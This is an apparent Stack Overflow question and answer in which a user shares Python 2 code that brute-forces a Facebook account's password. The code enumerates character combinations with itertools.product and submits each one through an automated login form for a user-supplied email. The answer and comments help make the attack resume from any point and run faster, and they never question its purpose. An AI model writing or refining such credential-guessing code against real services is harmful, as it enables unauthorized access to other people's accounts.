<div class="post-text" itemprop="text">
<p>So I have been using <code>Itertools</code> in python to make a brute forcing application of sorts. I have managed to get the code working fine and it works perfectly returning all the incorrect answers untill it get's the correct answer..
But I keep reaching a point in my application when it say's there is not enough memory?:s</p>
<p>My code is simple, it imports ascii - lowercase and uppercase from the <code>strings</code> module and it imports product from <code>Itertools</code> and uses 3 for loops, looping through all the chars defined</p>
<p>But it keeps saying there is not enough memory.. if I was to hazard a guess it is due to the amount of RAM I have (4GB) and it not being able to store enough to the Memory, but once it has looped one result why does it not remove that from the memory?</p>
<p>The code is:</p>
<pre><code>chars = ascii_lowercase + ascii_uppercase + digits

state = False
for i in range(6, 16):
    if state: break
    try:
        for x in product(chars, repeat=i):
            tmp = ""
            try:
                for z in x:
                    tmp += z
                print tmp
                if login(tmp):
                    state = True
                    break
            except Exception as e:
                print e
                raw_input("An Error has occured.\nFix the issue and press enter to continue.")

    except Exception  as e:
        print e
        raw_input("An Error has occured.\nFix the issue and press enter to continue.")
</code></pre>
<p>the first loop is just for the amount of characters in each string it tests
the second loop uses product to loop through characters and iterate through everything so it goes a, b - aa, ab - aaa, aab and so forth and the third loop is because the answers are returned in a tuple and i use that to convert it to a string</p>
<p>The state variable is so that it does not continue looping after it has found a result and you can probably understand the rest.
Except the Try/Except statements, they are just so you don't have to restart every time there is an error giving you a chance to fix it.</p>
<h1>My question now is:</h1>
<p>Is there any way to use itertools product to start from a point eg it usually starting at a but i want it to start at cB1o or what ever else</p>
<h3>Or</h3>
<p>Is there any way to stop my memory filling up (remove the used values from the memory)?</p>
<h1>Edit</h1>
<pre><code>def login (psw):
    global url
    op.open(url)

    op.select_form(nr=0)
    op.form["email"] = email
    op.form["pass"] = psw

    op.submit()

    if op.title() == "Facebook":
        return True
    else:
        return False
</code></pre>
<p>email is the user's input</p>
</div>
<div class="post-text" itemprop="text">
<h2>Memory Problem</h2>
<p>As shown, the code doesn't contain accumulate any values in memory.  So, the source of OP's memory issues lies elsewhere.</p>
<h2>Exploration Code</h2>
<p>The posted code can be cleaned-up and sped-up by using using <a href="https://docs.python.org/2.7/library/stdtypes.html#str.join" rel="nofollow noreferrer"><em>str.join()</em></a> instead of <code>+=</code>.  Also, it can benefit by using <a href="https://docs.python.org/2.7/library/itertools.html#itertools.imap" rel="nofollow noreferrer"><em>itertools.imap()</em></a> to apply the join operation: </p>
<pre><code>for i in xrange(6, 16):
    for password in imap(''.join, product(chars, repeat=i)):
        print password
        ...
</code></pre>
<h2>Arbitrary start point for any Python version</h2>
<p>In essence, the algorithm for <em>itertools.product()</em> essentially "rotates wheels like an <a href="https://en.wikipedia.org/wiki/Odometer" rel="nofollow noreferrer">odometer</a>".  Accordingly, you can select an arbitrary start point just by "pre-rotating the wheels" to the desired start position:</p>
<pre><code>&gt;&gt;&gt; from itertools import product
&gt;&gt;&gt; from functools import partial

&gt;&gt;&gt; def rotate(chars, n):
        'Rotate a string *n* characters to the left'
        return chars[n:] + chars[:n]

&gt;&gt;&gt; chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
&gt;&gt;&gt; [chars.index(c) for c in 'cB1n']          # Find indices for "cB1o"
[2, 27, 53, 14]
&gt;&gt;&gt; it = product(*map(partial(rotate, chars), [2, 27, 53, 14]))
&gt;&gt;&gt; next(it)                                  # Now generate "cB1o"
('c', 'B', '1', 'o')
&gt;&gt;&gt; next(it)                                  # ... and so on ...
('c', 'B', '1', 'p')
</code></pre>
<p>Note, the iterator will now "wrap-around" the original start point of <code>('a', 'a', 'a', 'a')</code>; however, this is easy remedied by truncating the sequence with <a href="https://docs.python.org/2.7/library/itertools.html#itertools.islice" rel="nofollow noreferrer"><em>itertools.islice()</em></a>:</p>
<pre><code>&gt;&gt;&gt; from itertools import islice

&gt;&gt;&gt; # Compute how many iterations are left
&gt;&gt;&gt; len(chars)**4 - reduce(lambda c, i: len(chars)*c + i, (2, 27, 53, 14), 0)
14192592
it = islice(product(*map(partial(rotate, chars), (2, 27, 53, 14))), 14192592)
</code></pre>
<h2>Alternative Approach Specific to Python 3</h2>
<p>In Python 3, <a href="https://docs.python.org/3/library/itertools.html#itertools.product" rel="nofollow noreferrer"><em>itertools.product()</em></a> has a <code>__setstate__()</code> method that sets the pool indices to arbitrary values. The product iterator can be started at <code>cB1o</code> by setting indices corresponding to the immediately preceding value, <code>cB1n</code>.</p>
<pre><code>&gt;&gt;&gt; chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
&gt;&gt;&gt; tuple([chars.index(c) for c in 'cB1n'])   # Find indices for "cB1n"
(2, 27, 53, 13)
&gt;&gt;&gt; it = product(chars, repeat=4)
&gt;&gt;&gt; it.__setstate__((2, 27, 53, 13))          # Set the state to "cB1n"
&gt;&gt;&gt; next(it)                                  # Now generate "cB1o"
('c', 'B', '1', 'o')
&gt;&gt;&gt; next(it)                                  # ... and so on ...
('c', 'B', '1', 'p')
</code></pre>
</div>
<span class="comment-copy">I don't see anything here that would cause a memory problem. What does the definition of your <code>login</code> function look like?</span>
<span class="comment-copy">Number of lower case letters + number of upper case letters + number of digits = 26 + 26 + 10 = 62. 62 ^ 16 is 4.7672402e+28. So...it's clear why your code would take forever to finish...but I don't understand why you would run out of memory because product is an iterator.</span>
<span class="comment-copy">@Kevin I'll edit the question to add that</span>
<span class="comment-copy">@Shashank yeah that is alot but most commonly passwords have a 64 char long limit so that should be the limit so that would be alot more and That's why im abit confused myself</span>
<span class="comment-copy">I see...Now as for starting an iterator from a certain point, you can use <a href="https://docs.python.org/2/library/itertools.html#itertools.islice" rel="nofollow noreferrer">docs.python.org/2/library/itertools.html#itertools.islice</a> for efficient advancement of iterator position though I don't know if it will help in your case.</span>
